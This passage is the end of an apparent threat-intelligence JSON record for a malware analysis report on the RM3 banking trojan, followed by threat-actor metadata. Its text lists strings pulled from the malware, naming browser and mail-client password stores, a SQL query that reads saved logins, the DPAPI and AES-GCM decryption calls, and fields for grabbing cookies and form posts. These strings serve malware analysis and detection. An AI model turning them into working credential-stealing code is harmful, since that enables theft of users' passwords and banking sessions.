JAVASCRIPT\nSECUR32.DLL\nSECURITY.DLL\nInitSecurityInterfaceW\nBUNNY\nSYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\nSendTrustedIssuerList\n@ID@\nURL=\nMain\n@RANDSTR@\nBlocked\n@GROUP@\nBLOCKCFG=\nLOADCFG=\nDELCFG=\nVIDEO=\nVNC=\nSOCKS=\nCFGON=\nCFGOFF=\nENCRYPT=\nhttp\n@%s@\nhttp\ngrabs=\nPOST\nPUT\nGET\nHEAD\nOPTIONS\nURL: %s\nREF: %s\nLANG: %s\nAGENT: %s\nCOOKIE: %s\nPOST:\nUSER: %s\nUSERID: %s\n@*@\n***\nIE:\n\n```\n\n-----\n\n```\n:Microsoft Unified Security Protocol Provider\nFF:\nCR:\nED:\niexplore\nfirefox\nchrome\nedge\nInitRecv %u, %s%s\nCompleteRecv %u, %s%s\nLoadUrl %u, %s\nNEWGRAB\nCertGetCertificateChain\nCertVerifyCertificateChainPolicy\nNSS_Init\nNSS_Shutdown\nnss3.dll\nPK11_GetInternalKeySlot\nPK11_FreeSlot\nPK11_Authenticate\nPK11SDR_Decrypt\nhostname\nvaultcli\n%PROGRAMFILES%\\Mozilla Thunderbird\nencryptedUsername\n%USERPROFILE%\\AppData\\Roaming\\Thunderbird\\Profiles\\*.default\nencryptedPassword\nlogins.json\n%systemroot%\\syswow64\\svchost.exe\nSoftware\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2\nFindCloseUrlCache\nVaultEnumerateItems\ntype=%s, name=%s, address=%s, server=%s, port=%u, ssl=%s, user=%s, password=%s\nFindNextUrlCacheEntryW\nFindFirstUrlCacheEntryW\nDeleteUrlCacheEntryW\nVaultEnumerateVaults\nVaultOpenVault\nVaultCloseVault\nVaultFree\nVaultGetItem\nc:\\test\\sqlite3.dll\nSELECT origin_url, username_value, password_value FROM logins\nencrypted_key\":\"\ndefault\\login data\nBCryptSetProperty\n%userprofile%\\appdata\\local\\google\\chrome\\user data\nlocal state\nDPAPI\nv10\nBCryptDecrypt\nAES\nMicrosoft Primitive Provider\nBCryptDestroyKey\nBCryptCloseAlgorithmProvider\n\n```\n\n-----\n\n```\nChainingModeGCM\nBCryptOpenAlgorithmProvider\nBCryptGenerateSymmetricKey\nBCRYPT\n%userprofile%\\appData\\local\\microsoft\\edge\\user data\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-04 - RM3 – Curiosities of the wildest banking malware.pdf"
    ],
    "report_names": [
        "2021-05-04 - RM3 – Curiosities of the wildest banking malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "f67fb5b3-b0d4-484c-943e-ebf12251eff6",
            "created_at": "2022-10-25T16:07:23.605611Z",
            "updated_at": "2025-03-27T02:02:09.884272Z",
            "deleted_at": null,
            "main_name": "FamousSparrow",
            "aliases": [
                "Earth Estries"
            ],
            "source_name": "ETDA:FamousSparrow",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "faa4a29b-254a-45bd-b412-9a1cbddbd5e3",
            "created_at": "2022-10-25T16:07:23.80111Z",
            "updated_at": "2025-03-27T02:02:09.985067Z",
            "deleted_at": null,
            "main_name": "LookBack",
            "aliases": [
                "FlowingFrog",
                "LookBack",
                "LookingFrog",
                "TA410",
                "Witchetty"
            ],
            "source_name": "ETDA:LookBack",
            "tools": [
                "FlowCloud",
                "GUP Proxy Tool",
                "SodomMain",
                "SodomMain RAT",
                "SodomNormal"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1998ad13-b343-4409-9a37-b1930d156a28",
            "created_at": "2023-09-17T02:00:09.948891Z",
            "updated_at": "2025-03-27T02:00:03.137557Z",
            "deleted_at": null,
            "main_name": "Storm-0324",
            "aliases": [
                "DEV-0324",
                "Sagrid",
                "TA543"
            ],
            "source_name": "MISPGALAXY:Storm-0324",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535608,
    "ts_updated_at": 1743041735,
    "ts_creation_date": 1653700868,
    "ts_modification_date": 1653700868,
    "files": {
        "pdf": "https://archive.orkl.eu/ff562e506a915909c41a9d511fd9890f108a02d2.pdf",
        "text": "https://archive.orkl.eu/ff562e506a915909c41a9d511fd9890f108a02d2.txt",
        "img": "https://archive.orkl.eu/ff562e506a915909c41a9d511fd9890f108a02d2.jpg"
    }
}